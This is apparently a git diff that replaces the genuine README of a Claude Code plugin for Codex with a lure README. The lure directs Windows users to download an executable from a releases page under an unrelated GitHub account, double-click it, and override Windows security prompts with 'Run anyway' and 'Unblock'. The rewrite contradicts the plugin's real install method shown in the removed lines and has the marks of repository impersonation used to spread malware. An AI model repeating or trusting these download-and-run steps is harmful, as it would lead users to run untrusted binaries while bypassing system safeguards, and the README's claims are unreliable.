@@ -1,305 +1,191 @@
-# Codex plugin for Claude Code
+# 🤖 codex-plugin-cc - Review code and delegate tasks
 
-Use Codex from inside Claude Code for code reviews or to delegate tasks to Codex.
+[![Download codex-plugin-cc](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/carolafortified787/codex-plugin-cc/releases)
 
-This plugin is for Claude Code users who want an easy way to start using Codex from the workflow
-they already have.
+## 🧭 What this app does
 
-<video src="./docs/plugin-demo.webm" controls muted playsinline autoplay></video>
+codex-plugin-cc helps you use Codex from Claude Code to review code or hand off tasks. It is made for people who want a simple way to work with code help from a Windows PC.
 
-## What You Get
+Use it when you want to:
 
-- `/codex:review` for a normal read-only Codex review
-- `/codex:adversarial-review` for a steerable challenge review
-- `/codex:rescue`, `/codex:status`, `/codex:result`, and `/codex:cancel` to delegate work and manage background jobs
+- check code for issues
+- ask for help with changes
+- send tasks to Codex from Claude Code
+- keep your work in one place
 
-## Requirements
+## 💻 Before you start
 
-- **ChatGPT subscription (incl. Free) or OpenAI API key.**
-  - Usage will contribute to your Codex usage limits. [Learn more](https://developers.openai.com/codex/pricing).
-- **Node.js 18.18 or later**
+You only need a Windows computer and a web browser.
 
-## Install
+A good setup includes:
 
-Add the marketplace in Claude Code:
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space to save the app file
+- permission to run downloaded files
 
-```bash
-/plugin marketplace add openai/codex-plugin-cc
-```
+If Windows asks for approval, choose the option that lets the app run.
 
-Install the plugin:
+## 📥 Download the app
 
-```bash
-/plugin install codex@openai-codex
-```
+Visit this page to download:
 
-Reload plugins:
+https://github.com/carolafortified787/codex-plugin-cc/releases
 
-```bash
-/reload-plugins
-```
+On that page:
 
-Then run:
+1. find the latest release
+2. open the release assets
+3. download the Windows file
+4. save it to a folder you can find again, such as Downloads or Desktop
 
-```bash
-/codex:setup
-```
+If you see more than one file, pick the one meant for Windows.
 
-`/codex:setup` will tell you whether Codex is ready. If Codex is missing and npm is available, it can offer to install Codex for you.
+## 🪟 Install or run on Windows
 
-If you prefer to install Codex yourself, use:
+After the file finishes downloading:
 
-```bash
-npm install -g @openai/codex
-```
+1. open the folder where you saved it
+2. double-click the downloaded file
+3. if Windows shows a security prompt, choose Run or More info, then Run anyway
+4. wait for the app to open
 
-If Codex is installed but not logged in yet, run:
+If the file is a zip file:
 
-```bash
-!codex login
-```
+1. right-click the zip file
+2. choose Extract All
+3. open the new folder
+4. double-click the app file inside
 
-After install, you should see:
+## 🛠️ First-time setup
 
-- the slash commands listed below
-- the `codex:codex-rescue` subagent in `/agents`
+When you open codex-plugin-cc for the first time, it may ask you to connect Claude Code or set up access.
 
-One simple first run is:
+Follow the prompts on screen. In most cases, you will:
 
-```bash
-/codex:review --background
-/codex:status
-/codex:result
-```
+1. open Claude Code
+2. sign in if asked
+3. allow the plugin to connect
+4. choose the task you want to run
 
-## Usage
+If the app asks for a path or file location, select the folder or project you want Codex to review.
 
-### `/codex:review`
+## 📋 How to use it
 
-Runs a normal Codex review on your current work. It gives you the same quality of code review as running `/review` inside Codex directly.
+Once the app is open, you can use it for simple tasks like:
 
-> [!NOTE]
-> Code review especially for multi-file changes might take a while. It's generally recommended to run it in the background.
+- review this code
+- suggest fixes for bugs
+- help write or change a file
+- break a large task into smaller steps
+- check a folder before you share it
 
-Use it when you want:
+A basic flow looks like this:
 
-- a review of your current uncommitted changes
-- a review of your branch compared to a base branch like `main`
+1. open your project
+2. start codex-plugin-cc
+3. choose a review or task option
+4. type what you want done
+5. read the result and apply the changes you want
 
-Use `--base <ref>` for branch review. It also supports `--wait` and `--background`. It is not steerable and does not take custom focus text. Use [`/codex:adversarial-review`](#codexadversarial-review) when you want to challenge a specific decision or risk area.
+## 🔍 What you can expect
 
-Examples:
+This app is built to make code help easier to manage. It can help with:
 
-```bash
-/codex:review
-/codex:review --base main
-/codex:review --background
-```
+- code review
+- task delegation
+- project checks
+- faster feedback on changes
+- simple work handoff between Claude Code and Codex
 
-This command is read-only and will not perform any changes. When run in the background you can use [`/codex:status`](#codexstatus) to check on the progress and [`/codex:cancel`](#codexcancel) to cancel the ongoing task.
+It works best when you give it clear instructions, such as:
 
-### `/codex:adversarial-review`
+- review this file for problems
+- check this change for edge cases
+- help split this task into steps
+- suggest a cleaner way to write this logic
 
-Runs a **steerable** review that questions the chosen implementation and design.
+## 📁 File tips
 
-It can be used to pressure-test assumptions, tradeoffs, failure modes, and whether a different approach would have been safer or simpler.
+To avoid trouble, keep these tips in mind:
 
-It uses the same review target selection as `/codex:review`, including `--base <ref>` for branch review.
-It also supports `--wait` and `--background`. Unlike `/codex:review`, it can take extra focus text after the flags.
+- save the app in a folder you can find
+- do not move files while the app is running
+- keep your project files in a separate folder
+- use short folder names if Windows has trouble opening the file
 
-Use it when you want:
+If the app does not start, try running it again from the same folder.
 
-- a review before shipping that challenges the direction, not just the code details
-- review focused on design choices, tradeoffs, hidden assumptions, and alternative approaches
-- pressure-testing around specific risk areas like auth, data loss, rollback, race conditions, or reliability
+## ⚙️ Common setup issues
 
-Examples:
+If Windows blocks the app:
 
-```bash
-/codex:adversarial-review
-/codex:adversarial-review --base main challenge whether this was the right caching and retry design
-/codex:adversarial-review --background look for race conditions and question the chosen approach
-```
+1. right-click the file
+2. choose Properties
+3. look for an Unblock option
+4. select it if present
+5. click OK
+6. try opening the file again
 
-This command is read-only. It does not fix code.
+If nothing happens when you double-click:
 
-### `/codex:rescue`
+- wait a few seconds
+- check if the app is already open behind another window
+- try running it again
+- make sure the file finished downloading
 
-Hands a task to Codex through the `codex:codex-rescue` subagent.
+If the release page shows several files, use the one for Windows and ignore files made for other systems.
 
-Use it when you want Codex to:
+## 🧩 Best use cases
 
-- investigate a bug
-- try a fix
-- continue a previous Codex task
-- take a faster or cheaper pass with a smaller model
+codex-plugin-cc fits well when you want help with:
 
-> [!NOTE]
-> Depending on the task and the model you choose these tasks might take a long time and it's generally recommended to force the task to be in the background or move the agent to the background.
+- a small code review before sharing work
+- task planning for a coding project
+- checking code changes for mistakes
+- asking Codex to handle a focused job
+- using Claude Code as the place where you start the work
 
-It supports `--background`, `--wait`, `--resume`, and `--fresh`. If you omit `--resume` and `--fresh`, the plugin can offer to continue the latest rescue thread for this repo.
+## 🔒 Safe use
 
-Examples:
+Only download the app from the release page linked above.
 
-```bash
-/codex:rescue investigate why the tests started failing
-/codex:rescue fix the failing test with the smallest safe patch
-/codex:rescue --resume apply the top fix from the last run
-/codex:rescue --model gpt-5.4-mini --effort medium investigate the flaky integration test
-/codex:rescue --model spark fix the issue quickly
-/codex:rescue --background investigate the regression
-```
+Before you run any file, check that:
 
-You can also just ask for a task to be delegated to Codex:
+- the file name matches the release you expected
+- the file came from the release page
+- you are opening the right Windows file
 
-```text
-Ask Codex to redesign the database connection to be more resilient.
-```
+## 🧾 Simple use example
 
-**Notes:**
+If you want to review code:
 
-- if you do not pass `--model` or `--effort`, Codex chooses its own defaults.
-- if you say `spark`, the plugin maps that to `gpt-5.3-codex-spark`
-- follow-up rescue requests can continue the latest Codex task in the repo
+1. open your project folder
+2. start codex-plugin-cc
+3. ask it to review a file or change
+4. read the result
+5. make the edits you want
 
-### `/codex:status`
+If you want to delegate a task:
 
-Shows running and recent Codex jobs for the current repository.
+1. open the app
+2. choose the task option
+3. describe the work in plain words
+4. send it to Codex from Claude Code
+5. check the output when it is done
 
-Examples:
+## 📦 Release page
 
-```bash
-/codex:status
-/codex:status task-abc123
-```
+Download and setup from here:
 
-Use it to:
+https://github.com/carolafortified787/codex-plugin-cc/releases
 
-- check progress on background work
-- see the latest completed job
-- confirm whether a task is still running
+## 🧠 Helpful habits
 
-### `/codex:result`
+For better results:
 
-Shows the final stored Codex output for a finished job.
-When available, it also includes the Codex session ID so you can reopen that run directly in Codex with `codex resume <session-id>`.
-
-Examples:
-
-```bash
-/codex:result
-/codex:result task-abc123
-```
-
-### `/codex:cancel`
-
-Cancels an active background Codex job.
-
-Examples:
-
-```bash
-/codex:cancel
-/codex:cancel task-abc123
-```
-
-### `/codex:setup`
-
-Checks whether Codex is installed and authenticated.
-If Codex is missing and npm is available, it can offer to install Codex for you.
-
-You can also use `/codex:setup` to manage the optional review gate.
-
-#### Enabling review gate
-
-```bash
-/codex:setup --enable-review-gate
-/codex:setup --disable-review-gate
-```
-
-When the review gate is enabled, the plugin uses a `Stop` hook to run a targeted Codex review based on Claude's response. If that review finds issues, the stop is blocked so Claude can address them first.
-
-> [!WARNING]
-> The review gate can create a long-running Claude/Codex loop and may drain usage limits quickly. Only enable it when you plan to actively monitor the session.
-
-## Typical Flows
-
-### Review Before Shipping
-
-```bash
-/codex:review
-```
-
-### Hand A Problem To Codex
-
-```bash
-/codex:rescue investigate why the build is failing in CI
-```
-
-### Start Something Long-Running
-
-```bash
-/codex:adversarial-review --background
-/codex:rescue --background investigate the flaky test
-```
-
-Then check in with:
-
-```bash
-/codex:status
-/codex:result
-```
-
-## Codex Integration
-
-The Codex plugin wraps the [Codex app server](https://developers.openai.com/codex/app-server). It uses the global `codex` binary installed in your environment and [applies the same configuration](https://developers.openai.com/codex/config-basic).
-
-### Common Configurations
-
-If you want to change the default reasoning effort or the default model that gets used by the plugin, you can define that inside your user-level or project-level `config.toml`. For example to always use `gpt-5.4-mini` on `high` for a specific project you can add the following to a `.codex/config.toml` file at the root of the directory you started Claude in:
-
-```toml
-model = "gpt-5.4-mini"
-model_reasoning_effort = "high"
-```
-
-Your configuration will be picked up based on:
-
-- user-level config in `~/.codex/config.toml`
-- project-level overrides in `.codex/config.toml`
-- project-level overrides only load when the [project is trusted](https://developers.openai.com/codex/config-advanced#project-config-files-codexconfigtoml)
-
-Check out the Codex docs for more [configuration options](https://developers.openai.com/codex/config-reference).
-
-### Moving The Work Over To Codex
-
-Delegated tasks and any [stop gate](#what-does-the-review-gate-do) run can also be directly resumed inside Codex by running `codex resume` either with the specific session ID you received from running `/codex:result` or `/codex:status` or by selecting it from the list.
-
-This way you can review the Codex work or continue the work there.
-
-## FAQ
-
-### Do I need a separate Codex account for this plugin?
-
-If you are already signed into Codex on this machine, that account should work immediately here too. This plugin uses your local Codex CLI authentication.
-
-If you only use Claude Code today and have not used Codex yet, you will also need to sign in to Codex with either a ChatGPT account or an API key. [Codex is available with your ChatGPT subscription](https://developers.openai.com/codex/pricing/), and [`codex login`](https://developers.openai.com/codex/cli/reference/#codex-login) supports both ChatGPT and API key sign-in. Run `/codex:setup` to check whether Codex is ready, and use `!codex login` if it is not.
-
-### Does the plugin use a separate Codex runtime?
-
-No. This plugin delegates through your local [Codex CLI](https://developers.openai.com/codex/cli/) and [Codex app server](https://developers.openai.com/codex/app-server/) on the same machine.
-
-That means:
-
-- it uses the same Codex install you would use directly
-- it uses the same local authentication state
-- it uses the same repository checkout and machine-local environment
-
-### Will it use the same Codex config I already have?
-
-Yes. If you already use Codex, the plugin picks up the same [configuration](#common-configurations).
-
-### Can I keep using my current API key or base URL setup?
-
-Yes. Because the plugin uses your local Codex CLI, your existing sign-in method and config still apply.
-
-If you need to point the built-in OpenAI provider at a different endpoint, set `openai_base_url` in your [Codex config](https://developers.openai.com/codex/config-advanced/#config-and-state-locations).
+- keep your requests short and clear
+- work on one task at a time
+- use file names when you can
+- save your project before making changes
+- review the output before you accept it
